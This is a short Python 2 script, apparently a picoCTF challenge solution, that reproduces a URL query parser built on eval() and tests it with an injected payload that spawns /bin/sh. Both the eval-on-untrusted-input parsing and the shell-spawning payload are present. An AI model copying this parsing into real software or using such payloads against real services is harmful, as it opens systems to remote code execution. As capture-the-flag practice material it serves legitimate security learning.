#!/usr/bin/python -u
# task4.py
from BaseHTTPServer import HTTPServer,BaseHTTPRequestHandler
from SocketServer import ForkingMixIn
from cgi import escape
from os import path
from sys import stdin,stdout
import traceback

def getQueryDictFromURL(url):
    query = None
    temp = url.rsplit('?', 1)
    if len(temp) == 1:
        # No query string!
        query = {}
    else:
        temp = temp[1].rsplit('#', 1)[0] # Split away fragment id
        temp = temp.replace('=', '":"').replace('&', '","') # Turn into python dictonary syntax
        query = eval('{"' + temp + '"}')
        
        # Un-percent encode query items
        for k in query:
            print 'k',k
            temp = query[k].split('%')
            for i in range(1, len(temp)):
                print 'i',i
                print 'temp[i]',temp[i][:2],temp[i][2:]
                temp[i] = eval('"\\x' + temp[i][:2] + '"') + temp[i][2:]
            query[k] = ''.join(temp)
    
    return query

print getQueryDictFromURL('python.picoctf.com?cat=%%"+path.os.execl("/bin/sh","sh")+"')

